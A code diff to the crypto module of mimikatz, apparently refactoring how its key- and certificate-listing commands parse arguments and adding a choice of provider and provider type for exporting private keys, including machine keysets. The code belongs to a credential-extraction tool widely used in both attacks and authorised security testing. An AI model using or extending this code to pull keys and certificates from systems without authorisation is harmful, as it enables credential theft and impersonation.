@@ -49,13 +49,13 @@ bool mod_mimikatz_crypto::listProviders(vector<wstring> * arguments)
 
 bool mod_mimikatz_crypto::listKeys(vector<wstring> * arguments)
 {
-	listAndOrExportKeys(!arguments->empty(), false);
+	listAndOrExportKeys(arguments, false);
 	return true;
 }
 
 bool mod_mimikatz_crypto::exportKeys(vector<wstring> * arguments)
 {
-	listAndOrExportKeys(!arguments->empty(), true);
+	listAndOrExportKeys(arguments, true);
 	return true;
 }
 
@@ -82,44 +82,41 @@ bool mod_mimikatz_crypto::listStores(vector<wstring> * arguments)
 
 bool mod_mimikatz_crypto::listCertificates(vector<wstring> * arguments)
 {
-	wstring monEmplacement = L"CERT_SYSTEM_STORE_CURRENT_USER";
-	wstring monStore = L"My";
-
-	if(arguments->size() == 1)
-	{
-		monEmplacement = arguments->front();
-	}
-	else if(arguments->size() == 2)
-	{
-		monEmplacement = arguments->front();
-		monStore = arguments->back();
-	}
-
-	listAndOrExportCertificates(monEmplacement, monStore, false);
+	listAndOrExportCertificates(arguments, false);
 	return true;
 }
 
 bool mod_mimikatz_crypto::exportCertificates(vector<wstring> * arguments)
 {
-	wstring monEmplacement = L"CERT_SYSTEM_STORE_CURRENT_USER";
-	wstring monStore = L"My";
-
-	if(arguments->size() == 1)
-	{
-		monEmplacement = arguments->front();
-	}
-	else if(arguments->size() == 2)
-	{
-		monEmplacement = arguments->front();
-		monStore = arguments->back();
-	}
-
-	listAndOrExportCertificates(monEmplacement, monStore, true);
+	listAndOrExportCertificates(arguments, true);
 	return true;
 }
 
-void mod_mimikatz_crypto::listAndOrExportKeys(bool isMachine, bool exportKeys)
+void mod_mimikatz_crypto::listAndOrExportKeys(vector<wstring> * arguments, bool exportKeys)
 {
+	bool isMachine = false;
+	DWORD providerType = PROV_RSA_FULL;
+	wstring provider = MS_ENHANCED_PROV;
+
+	switch (arguments->size())
+	{
+		case 1:
+			isMachine = true;
+		case 0:
+			break;
+		case 3:
+			isMachine = true;
+			arguments->erase(arguments->begin());
+		case 2:
+			mod_cryptoapi::getProviderString(arguments->front(), &provider);
+			mod_cryptoapi::getProviderTypeFromString(arguments->back(), &providerType);
+			break;
+		default :
+			wcout << L"Erreur d\'arguments, attendu : [machine] [provider providerType]" << endl;
+			return;
+	}
+	
+	
 	wstring type = (isMachine ? L"machine" : L"user");
 
 	vector<wstring> * monVectorKeys = new vector<wstring>();
@@ -135,7 +132,7 @@ void mod_mimikatz_crypto::listAndOrExportKeys(bool isMachine, bool exportKeys)
 			wcout << L"\t - " << *monContainer << endl;
 
 			HCRYPTPROV hCryptKeyProv = NULL;
-			if(CryptAcquireContext(&hCryptKeyProv, monContainer->c_str(), MS_ENH_RSA_AES_PROV, PROV_RSA_AES, NULL | (isMachine ? CRYPT_MACHINE_KEYSET : NULL)))
+			if(CryptAcquireContext(&hCryptKeyProv, monContainer->c_str(), provider.c_str(), providerType, NULL | (isMachine ? CRYPT_MACHINE_KEYSET : NULL)))
 			{
 				HCRYPTKEY maCle = NULL;
 				for(DWORD ks = AT_KEYEXCHANGE; (ks <= AT_SIGNATURE) && !maCle; ks++)
@@ -246,8 +243,22 @@ void mod_mimikatz_crypto::listAndOrExportKeys(bool isMachine, bool exportKeys)
 }
 
 
-void mod_mimikatz_crypto::listAndOrExportCertificates(wstring monEmplacement, wstring monStore, bool exportCert)
+void mod_mimikatz_crypto::listAndOrExportCertificates(vector<wstring> * arguments, bool exportCert)
 {
+	wstring monEmplacement = L"CERT_SYSTEM_STORE_CURRENT_USER";
+	wstring monStore = L"My";
+
+	if(arguments->size() == 1)
+	{
+		monEmplacement = arguments->front();
+	}
+	else if(arguments->size() == 2)
+	{
+		monEmplacement = arguments->front();
+		monStore = arguments->back();
+	}
+
+
 	wcout << L"Emplacement : \'" << monEmplacement << L'\'';
 
 	DWORD systemStore;
